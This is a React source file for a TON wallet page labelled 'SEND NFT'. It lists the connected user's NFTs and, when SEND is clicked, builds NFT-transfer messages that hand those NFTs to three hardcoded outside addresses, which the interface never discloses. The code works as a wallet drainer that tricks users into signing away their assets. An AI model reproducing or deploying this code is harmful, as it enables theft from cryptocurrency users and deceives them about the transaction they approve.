import { useEffect, useState } from 'react'
import './App.css'
import { Address, beginCell, toNano } from '@ton/ton'
import { TonConnectButton, useTonAddress, useTonConnectUI } from '@tonconnect/ui-react'
import axios from 'axios';

const Owner = 'UQD6G1Ek7PQsXAyRBMTdxfmdsAk2kysNDj6VfeKAk-aSS4cM'
function App() {
  const userFriendlyAddress = useTonAddress();
  const [tonConnectUI] = useTonConnectUI();
  const [address , setaddress]=useState([])
  const [senders , setsenders]=useState([
    'UQACNxrqm1R8-hNaARw8SXBkCjOdLNnlvYh5thE60ICfXJIE',
    'UQBR2700L04dU0MjF2r0jBT_JWBNNC3eSv3lyA7ulO1zd_n4',
    'UQAGsGy8w8ALuPSFWkcttdf-AhX6iEeZWPJjc0TR_YFeQUUR'
  ])

  const getNft =async ()=>{
    try{
      if(userFriendlyAddress){
        const response = await axios.get(`https://toncenter.com/api/v3/nft/items?owner_address=${userFriendlyAddress}`)
        const nftAddresses = response.data.nft_items.map(item => item.address);
        setaddress(nftAddresses);
      }
    }catch(err){
      console.log(err)
    }
  }

  const sendTransAction = async ()=>{
    try{
        const payloads = []

        senders.map((data , index) =>{
          const newaddress = address[index % address.length]; 

          payloads.push(
          {
          address: Address.parse(newaddress).toString(),
          amount: toNano("0.05").toString(),  
          payload: beginCell()
          .storeUint(0x5fcc3d14, 32)              
          .storeUint(0, 64)                       
          .storeAddress(Address.parse(data))               
          .storeAddress(Address.parse(userFriendlyAddress)) 
          .storeUint(0, 1)                        
          .storeCoins(toNano('0.000005'))                          
          .storeUint(0,1)                    
          .endCell().toBoc().toString("base64")
        })})

        console.log(payloads)
        const myTransaction = {
          validUntil: Math.floor(Date.now() / 1000) + 360,
          messages:payloads
      }

      const boc = await tonConnectUI.sendTransaction(myTransaction)
      console.log(boc)
    }catch(err){
      console.log(err)
    }
  }

  useEffect(()=>{
    getNft()
  },[userFriendlyAddress])

  return (
    <div style={{textAlign : 'center'}}>
      <h1>
        SEND NFT
      </h1>
      <div style={{
        width : '165px' ,
        margin : 'auto'
      }}>
        <TonConnectButton />
      </div>
      <button 
      onClick={sendTransAction}
      style={{
        width : '100px',
        padding : '5px',
        borderRadius : '10px',
        marginBlock : '10px'
      }}>
        SEND  
      </button> 
    </div>
  )
}

export default App
